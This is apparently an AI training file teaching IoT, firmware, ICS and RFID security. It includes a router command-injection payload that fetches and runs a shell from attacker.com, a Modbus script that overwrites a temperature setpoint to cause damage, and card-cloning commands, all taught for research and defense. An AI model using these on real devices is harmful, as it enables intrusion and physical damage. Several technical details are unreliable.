@@ -1,0 +1,465 @@
+================================================================================
+TITAN AI — TRAINING PACK 030: IoT AND EMBEDDED SYSTEMS SECURITY
+FIRMWARE ANALYSIS, HARDWARE ATTACKS, PROTOCOL SECURITY, INDUSTRIAL CONTROL SYSTEMS
+================================================================================
+
+================================================================================
+PART 1: IoT ATTACK SURFACE
+================================================================================
+
+--- THE IoT THREAT LANDSCAPE ---
+
+SCALE OF THE PROBLEM:
+  15+ billion IoT devices deployed globally (2024).
+  Majority run: Outdated Linux, no auto-update, default credentials, no EDR.
+  Average enterprise: Hundreds to thousands of unmanaged IoT devices on network.
+  Hospitals: Medical devices running Windows XP (FDA-approved, cannot update without reapproval).
+  Power grid: Industrial control systems from the 1980s now network-connected.
+  
+  IoT devices are: Long-lived (10-20 year lifecycle), rarely patched, often forgotten.
+  Security lifecycle of a desktop OS: 3-5 years.
+  Security lifecycle of a medical device: 10-15 years.
+  Gap: Devices from 2010 on your network in 2025. Running software from 2010.
+
+MIRAI BOTNET (2016) — THE WAKE-UP CALL:
+  Mirai: Malware that scanned internet for IoT devices with default credentials.
+  Used: 61 default username/password pairs hard-coded in the binary.
+  Infected: 600,000+ IoT devices (routers, cameras, DVRs).
+  Attack: 1.2 Tbps DDoS — the largest ever recorded at the time.
+  Target: Dyn DNS → Took offline Twitter, Netflix, Reddit, CNN, GitHub for hours.
+  
+  What Mirai proved:
+  - Default credentials on IoT = botnets at internet scale
+  - IoT security is national critical infrastructure security
+  - No patch mechanism = indefinite vulnerability
+  
+  Mirai source code released: Thousands of variants spawned.
+  Current botnets: Mirai variants still dominate IoT malware landscape.
+
+MIRAI SCANNING TECHNIQUE:
+  Generate random IPv4 addresses (excluding private, loopback, special ranges).
+  Connect to port 23 (Telnet) or 22 (SSH).
+  Try 61 credential pairs: admin/admin, root/root, admin/password, etc.
+  
+  Speed: Single infected device can scan the entire internet in ~60 minutes.
+  With 600K bots: Entire internet re-scanned every 6 seconds.
+  Every newly vulnerable device: Infected within minutes of becoming reachable.
+
+================================================================================
+PART 2: FIRMWARE ANALYSIS
+================================================================================
+
+--- FIRMWARE EXTRACTION ---
+
+FIRMWARE ACQUISITION METHODS:
+
+Method 1: Vendor download
+  Many manufacturers publish firmware updates on their website.
+  Download directly: No hardware needed.
+  Limitation: May not include bootloader or low-level components.
+
+Method 2: Network capture (OTA updates)
+  Set up MITM on device's network connection during firmware update.
+  Intercept: HTTP/HTTPS firmware download.
+  If HTTPS: Downgrade or use pinning bypass on device.
+  Tool: Wireshark, mitmproxy, Burp Suite.
+
+Method 3: UART/Serial console
+  UART: Universal Asynchronous Receiver-Transmitter. Serial port on board.
+  Most embedded devices: UART pins on PCB for debug console.
+  Connection: USB-to-UART adapter (CP2102, CH340). 3.3V logic level.
+  Baud rates: Try 115200, 57600, 38400, 9600.
+  
+  What you get: Boot log, U-Boot shell, Linux console, debug output.
+  Often: Root shell available during boot without credentials.
+  
+  Identify UART pins with multimeter:
+  - GND: 0V (continuity to known ground)
+  - VCC: 3.3V or 5V (high voltage, don't connect to UART adapter)
+  - TX: Fluctuates during boot (transmitting data)
+  - RX: Connect to TX of your adapter
+
+Method 4: JTAG
+  JTAG: Joint Test Action Group. Hardware debug interface.
+  Allows: Halt CPU, read/write memory and registers, step through instructions.
+  More powerful than UART: Can dump full memory including kernel, filesystem.
+  Tool: OpenOCD (open source), Segger J-Link (commercial).
+  Find JTAG pins: PCB silkscreen, datasheets, open-source hardware research.
+
+Method 5: Flash chip read
+  Identify: SPI or NAND flash chip on PCB.
+  Desolder or clip: Connect to flash programmer.
+  Tools: CH341A programmer (cheap, effective for SPI), Xgecu T56 (more capable).
+  Read: Full raw flash dump. Contains bootloader + kernel + rootfs + config.
+  
+  SPI flash pinout (typical):
+  1: CS# (Chip Select — active low)
+  2: MISO (Master In Slave Out — data from flash to programmer)
+  3: WP# (Write Protect — tie high to enable writes)
+  4: GND
+  5: MOSI (Master Out Slave In — data to flash)
+  6: CLK (Clock)
+  7: HOLD# (tie high)
+  8: VCC (3.3V)
+
+--- FIRMWARE ANALYSIS WITH BINWALK ---
+
+Binwalk: Firmware analysis tool. Identifies embedded file systems, compressed data, certificates.
+
+BASIC ANALYSIS:
+  binwalk firmware.bin
+  
+  Output example:
+  DECIMAL    HEXADECIMAL  DESCRIPTION
+  0          0x0          uImage header, header size: 64 bytes, compression type: lzma
+  64         0x40         LZMA compressed data
+  1245184    0x130000     Squashfs filesystem, little endian, version 4.0, 
+                          size: 6291456 bytes, blocksize: 131072 bytes
+
+EXTRACTION:
+  binwalk -e firmware.bin         # Extract all identified components
+  binwalk --dd=".*" firmware.bin  # Extract everything (more aggressive)
+  
+  # After extraction: _firmware.bin.extracted/ directory
+  # Contains: squashfs-root/ or similar filesystem
+  ls _firmware.bin.extracted/squashfs-root/
+  # Output: bin/ dev/ etc/ lib/ mnt/ proc/ sbin/ sys/ tmp/ usr/ var/
+
+FILESYSTEM ANALYSIS:
+  # Find hardcoded credentials
+  grep -r "password" _firmware.bin.extracted/squashfs-root/etc/
+  grep -r "admin" _firmware.bin.extracted/squashfs-root/etc/passwd
+  cat _firmware.bin.extracted/squashfs-root/etc/passwd
+  cat _firmware.bin.extracted/squashfs-root/etc/shadow
+  
+  # Find web interface files
+  ls _firmware.bin.extracted/squashfs-root/www/
+  ls _firmware.bin.extracted/squashfs-root/var/www/
+  
+  # Find startup scripts (where services are launched)
+  cat _firmware.bin.extracted/squashfs-root/etc/init.d/
+  cat _firmware.bin.extracted/squashfs-root/etc/rcS
+  
+  # Find encryption keys or certificates
+  find . -name "*.pem" -o -name "*.key" -o -name "*.crt" 2>/dev/null
+  
+  # Find binary executables for further analysis
+  file _firmware.bin.extracted/squashfs-root/bin/*
+  # Output: ... ELF 32-bit LSB executable, MIPS (architecture info for analysis)
+
+EMULATION WITH QEMU:
+  Can run firmware binaries on your x86 machine using QEMU.
+  
+  # For MIPS firmware:
+  sudo apt install qemu-user-static
+  
+  # Copy QEMU into extracted filesystem for chroot emulation
+  cp /usr/bin/qemu-mips-static _firmware.bin.extracted/squashfs-root/
+  
+  # Chroot into firmware filesystem
+  sudo chroot _firmware.bin.extracted/squashfs-root/ /bin/sh
+  # Now: Running firmware's shell on your machine
+  # Can: Run firmware binaries, test services, explore
+  
+  # Or: Full system emulation for web interface testing
+  # Run firmware's httpd webserver, connect to it with browser
+
+AUTOMATED IoT ANALYSIS (FIRMADYNE):
+  Full firmware emulation framework. Emulates complete firmware environment.
+  Automatically: Network configuration, service startup, web interface accessible.
+  Runs NVD vulnerability scanner against running firmware.
+  
+  firmadyne.py --firmware firmware.bin
+  # Output: Accessible web interface at http://192.168.0.100/
+  # Run: nikto, sqlmap, Burp Suite against it
+
+================================================================================
+PART 3: COMMON IoT VULNERABILITIES
+================================================================================
+
+--- OWASP IoT TOP 10 (2018) WITH EXPLOITATION DETAILS ---
+
+1. WEAK, GUESSABLE, OR HARDCODED PASSWORDS:
+  Default credentials: admin/admin, root/root, admin/1234.
+  Hard-coded credentials: Same password on all devices of that model.
+  Tool: Shodan → search "port:23" + vendor → find devices → try default creds.
+  Impact: Full remote access.
+  
+  Extraction from firmware:
+  strings firmware.bin | grep -i "passw\|secret\|key\|credential"
+  # Often: Hard-coded passwords in plaintext within binaries
+
+2. INSECURE NETWORK SERVICES:
+  Telnet: Plaintext, unencrypted. Should not exist on any device.
+  SSH with root login + password auth: One step above Telnet.
+  HTTP admin panel (no HTTPS): All admin traffic interceptable.
+  UPnP exposed externally: Many routers.
+  
+  UPnP abuse:
+  Any device on local network can open firewall holes via UPnP.
+  Malware on laptop → Opens port 22 to internet on router → SSH access from internet.
+  
+  UPnP mapping check:
+  upnpc -l  # List all current UPnP port mappings (upnpc utility)
+
+3. INSECURE ECOSYSTEM INTERFACES:
+  Web interface SQLi: Firmware web apps often written carelessly.
+  Web interface command injection: System() calls with user input.
+  
+  Classic IoT router command injection:
+  # Ping function often implemented as:
+  system("ping " + user_input)
+  
+  # Payload:
+  ip_address = "1.2.3.4; wget http://attacker.com/shell.sh -O /tmp/s && sh /tmp/s #"
+  # Result: Shell downloaded and executed on router
+
+4. LACK OF SECURE UPDATE MECHANISM:
+  No update mechanism at all: Vulnerable forever.
+  HTTP firmware updates: MITM → Replace firmware with malicious version.
+  No signature verification: Upload any firmware → Full device control.
+  
+  Unsigned firmware upload (common on cheap routers):
+  # Craft malicious firmware: Original filesystem + added backdoor
+  # Upload via web interface
+  # Device accepts, flashes, reboots with backdoored firmware
+  # Full persistent access
+
+5. USE OF INSECURE OR OUTDATED COMPONENTS:
+  BusyBox: Old version with known CVEs.
+  OpenSSL 0.9.8 (2002): On devices from 2015.
+  glibc 2.15: Multiple heap CVEs.
+  Linux kernel 2.6: Dozens of unpatched privilege escalation CVEs.
+  
+  Automated scan:
+  cve-bin-tool squashfs-root/  # Scans binaries for known CVE-vulnerable component versions
+
+================================================================================
+PART 4: INDUSTRIAL CONTROL SYSTEMS (ICS/SCADA) SECURITY
+================================================================================
+
+--- ICS FUNDAMENTALS ---
+
+ARCHITECTURE LAYERS:
+  Level 4: Enterprise network (business operations, ERP)
+  Level 3: Operations network (historians, engineering workstations)
+  Level 2: Control system network (HMI — Human Machine Interface)
+  Level 1: Control devices (PLCs — Programmable Logic Controllers)
+  Level 0: Field devices (sensors, actuators, motors, valves)
+  
+  The Purdue Model: Defines these levels and network segmentation between them.
+  AIR GAP: Level 2/3 should be completely isolated from Level 3/4.
+  Reality: Most ICS networks have multiple holes in this separation.
+
+PLC (PROGRAMMABLE LOGIC CONTROLLER):
+  Industrial computer for automating electromechanical processes.
+  Controls: Assembly lines, machines, robots, water treatment, power grid.
+  Programming: Ladder Logic (mimics relay logic), Function Block Diagrams, Structured Text.
+  Protocols: Modbus, DNP3, IEC 61850, PROFINET, EtherNet/IP.
+  Safety: PLCs control physical processes. Compromise = physical damage.
+
+SCADA (SUPERVISORY CONTROL AND DATA ACQUISITION):
+  Centralized system monitoring and controlling ICS.
+  Collects: Data from PLCs, sensors across large geographic area.
+  Displays: Plant status, alarms, historical data.
+  Software: Wonderware, iFIX, Ignition, SIMATIC WinCC (Siemens).
+
+HMI (HUMAN MACHINE INTERFACE):
+  Operator interface to ICS. Touchscreen or PC.
+  Shows: Process visualization, alarms, control buttons.
+  Often runs: Windows 7/XP (cannot update — stability requirements, vendor support ended).
+  Security: Often exposed on network, running outdated Windows.
+
+--- ICS PROTOCOLS ---
+
+MODBUS (1979, ancient but ubiquitous):
+  Simple, no authentication, no encryption.
+  Master/Slave: SCADA reads registers from PLCs.
+  
+  Modbus function codes:
+  0x01: Read Coils (discrete outputs)
+  0x03: Read Holding Registers (process data)
+  0x06: Write Single Register
+  0x10: Write Multiple Registers
+  0x2B: Read Device Identification
+  
+  Attack: Write to holding registers → change setpoints → physical process changed.
+  
+  python3 with pymodbus:
+  from pymodbus.client import ModbusTcpClient
+  
+  client = ModbusTcpClient('192.168.1.50', port=502)
+  client.connect()
+  
+  # Read current temperature setpoint (register 40001)
+  result = client.read_holding_registers(address=0, count=10, slave=1)
+  print(result.registers)  # Current setpoints
+  
+  # Write new setpoint (if no authentication — common)
+  client.write_register(address=0, value=9999, slave=1)  # Max temperature → damage
+  
+  NO AUTHENTICATION. Any device on network can do this.
+
+STUXNET (2010) — THE DEFINITIVE ICS ATTACK CASE STUDY:
+  Target: Iranian uranium enrichment facility (Natanz).
+  Goal: Damage Siemens S7 PLCs controlling Uranium hexafluoride centrifuges.
+  
+  Technical chain:
+  1. Windows zero-day: .lnk file vulnerability (CVE-2010-2568). USB delivery.
+  2. Windows rootkit: Hides Stuxnet from antivirus.
+  3. Propagation: 4 Windows zero-days (unprecedented). USB, network shares, printer spooler.
+  4. Target identification: Looks for Siemens Step 7 software (PLC programming software).
+  5. PLC attack: Intercepts Step 7 communications to PLC.
+     - Reads PLC ladder logic
+     - If specific Siemens S7-315/S7-417 with specific configuration detected:
+     - Injects malicious ladder logic blocks
+     - Hides injected code from operators (rootkit for PLCs)
+  6. Centrifuge sabotage:
+     - Periodically changes centrifuge motor speed (over-speed then under-speed)
+     - While displaying NORMAL readings to operators
+     - Centrifuges physically damaged from abnormal spinning
+     - Iran: Replaced ~1000 of 5000 centrifuges. Confused by the failures.
+  
+  What made Stuxnet unprecedented:
+  - 4 zero-day exploits in one piece of malware (extremely expensive/rare)
+  - Targeted physical destruction of specific hardware
+  - Hid itself from both IT and OT monitoring simultaneously
+  - Spread via USB to air-gapped network
+  - Contained false data injection to deceive human operators
+  
+  Attribution: US and Israel (Operation Olympic Games, confirmed by multiple sources).
+
+TRITON/TRITSIS (2017) — TARGETING SAFETY SYSTEMS:
+  Target: Petrochemical facility (Saudi Arabia, Tasnee).
+  Target: Safety Instrumented System (SIS) — Schneider Electric Triconex.
+  
+  SIS purpose: If process goes out of safe range → automatically shut down to prevent explosion.
+  Triton goal: Disable the safety system → allow catastrophic failure to occur.
+  
+  What happened: Triton caused SIS to fail to "safe state" twice (unexpected shutdown).
+  Investigation: Discovered Triton malware before achieving goal.
+  If successful: Plant explosion. Worker deaths.
+  
+  Why significant: First known malware targeting safety systems.
+  These systems are the last line of defense against industrial disasters.
+
+--- ICS DEFENSE ---
+
+NETWORK SEGMENTATION (PRIMARY DEFENSE):
+  Purdue Model zones strictly enforced.
+  Firewall between Level 3 and Level 2: Only specific historians, protocols allowed.
+  No internet connectivity from Level 2 or below.
+  No direct RDP/VNC from corporate network to HMIs.
+  
+  For remote access: Jump server in DMZ between Level 3 and corporate.
+  Not: VPN that places laptop on Level 2 network.
+
+ICS-SPECIFIC MONITORING (Claroty, Dragos, Nozomi):
+  Passive monitoring: Tap on ICS network. Reads traffic. Never touches devices.
+  Why passive: Active scanning can crash PLCs (not designed for network probing).
+  
+  What they detect:
+  - Asset discovery: Every PLC, HMI, historian on network
+  - Protocol baseline: What commands are normal on this network?
+  - Anomaly: PLC received write command at 3am (never happens normally)
+  - Known malware signatures: Stuxnet, Triton, INDUSTROYER patterns
+  - Lateral movement: IT malware that has crossed into OT network
+
+DRAGOS CROWN JEWEL ANALYSIS:
+  What assets, if compromised, cause: Catastrophic failure? Environmental damage? Deaths?
+  Those are Crown Jewels. Maximum segmentation, monitoring, access control.
+
+================================================================================
+PART 5: WIRELESS PROTOCOL ATTACKS
+================================================================================
+
+--- ZIGBEE AND Z-WAVE (HOME AUTOMATION) ---
+
+ZIGBEE:
+  2.4GHz. Low power. Mesh network. Smart lights, locks, thermostats.
+  Protocol: IEEE 802.15.4.
+  Encryption: AES-128. BUT: Key distribution often weak.
+  
+  Attack: Zigbee touchlink commissioning attack.
+  Touchlink: Feature to add new devices to network.
+  Attack: Send touchlink "factory reset" to nearby Zigbee bulb.
+  Bulb resets to factory, joins attacker's network.
+  Now: Attacker controls the bulb. Can use it to map network, attack hub.
+  
+  Killerbee (Zigbee attack framework):
+  zbstumbler        # Scan for Zigbee networks
+  zbdump -c 11 -f capture.pcap  # Capture Zigbee traffic on channel 11
+  zbgoodfind        # Find network encryption keys in capture
+  zbid              # Enumerate Zigbee devices
+
+BLE (BLUETOOTH LOW ENERGY):
+  Used by: Medical devices, fitness trackers, door locks, beacons.
+  
+  GAP (Generic Access Profile): Discovery and connection.
+  GATT (Generic Attribute Profile): Data exchange.
+  Characteristics: Data "endpoints" on BLE device.
+  
+  BLE attack: Unauthenticated GATT characteristics.
+  Many BLE devices: Expose GATT characteristics without any authentication.
+  Anyone within Bluetooth range: Can read/write characteristics.
+  
+  Tool: gattacker, btlejack, nRF Sniffer.
+  
+  Scan for BLE devices:
+  hcitool lescan                # List nearby BLE devices
+  gatttool -b AA:BB:CC:DD:EE:FF --interactive
+  > connect
+  > primary              # List GATT services
+  > characteristics      # List all characteristics
+  > char-read-uuid 2a37   # Read heart rate characteristic
+  > char-write-req 0x0028 01  # Write to characteristic (if unauthenticated)
+  
+  BLE lock attack (real-world):
+  Attacker: Sniffs BLE unlock command. Records handle + value.
+  Attack: Replay the exact command. No crypto breaks needed.
+  Fix: Rolling codes (like car key fobs). Challenge-response.
+
+--- RFID AND NFC ATTACKS ---
+
+RFID FREQUENCY RANGES:
+  LF (125 kHz): Old key fobs, animal tags, old access cards (EM4100, HID Prox).
+                No encryption. Trivially cloned.
+  HF (13.56 MHz): MIFARE Classic (weak crypto), NFC, modern smart cards.
+                  MIFARE Classic: CRYPTO1 cipher (custom, 48-bit, broken in 2008).
+
+PROXMARK 3 (RFID research tool):
+  pm3> lf search       # Detect and read LF RFID card
+  pm3> lf em 4x05 reader   # Read EM4100 card (common door badge)
+  
+  # Clone EM4100 to blank card:
+  pm3> lf em 4x05 clone --id 12345678  # Write to T5577 blank card
+  # Now: Cloned card works on the reader
+
+MIFARE CLASSIC ATTACK (hardnested attack):
+  MIFARE Classic: Used in millions of transit cards, office badges.
+  CRYPTO1: Proprietary, 48-bit key. Broken in 2008.
+  
+  pm3> hf mf autopwn  # Automated attack: Tries all known vulnerable sectors
+  # Recovers all sector keys from a few authenticated reads
+  # Then: Clone entire card
+  pm3> hf mf clone   # Clone recovered card to blank MIFARE card
+
+NFC RELAY ATTACK:
+  Relay: Extend NFC range using two devices.
+  Device 1 (near victim's card): Reads card, forwards to device 2.
+  Device 2 (near reader): Presents forwarded data to reader.
+  
+  Practical: Victim's card in pocket → relay on their coat → reader 50m away.
+  Used for: Contactless payment fraud, access control bypass.
+  Defense: Distance bounding protocols (measure round-trip time to verify proximity).
+
+================================================================================
+END OF PACK 030: IoT AND EMBEDDED SYSTEMS SECURITY
+Total: IoT threat landscape (Mirai botnet technical analysis), firmware extraction
+(UART/JTAG/SPI flash chip), Binwalk analysis and filesystem extraction, QEMU
+firmware emulation, OWASP IoT Top 10 with exploitation, ICS/SCADA architecture
+(Purdue Model, PLC/SCADA/HMI), Modbus protocol with Python exploitation, Stuxnet
+complete technical breakdown, Triton safety system attack, ICS defense (passive
+monitoring, Dragos), Zigbee attacks (Killerbee), BLE GATT attacks, RFID/NFC
+(Proxmark 3, MIFARE Classic autopwn, NFC relay attacks).
+================================================================================
